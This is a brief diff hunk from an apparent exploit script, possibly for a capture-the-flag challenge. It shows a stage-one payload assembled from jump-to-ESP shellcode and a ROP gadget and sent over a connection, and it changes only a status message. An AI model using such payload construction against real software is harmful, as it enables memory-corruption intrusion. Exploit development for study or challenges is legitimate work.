@@ -357,7 +357,7 @@ def exploit(conn):
     stage1 += jmp_esp_shellcode
     stage1 += p32(rop_gadget)
 
-    print("Stage1: Leaking memory to the heap")
+    print("Stage1: Leaking ESP")
     print("Sending: {}".format(repr(stage1)))
     conn.sendline(stage1)
     
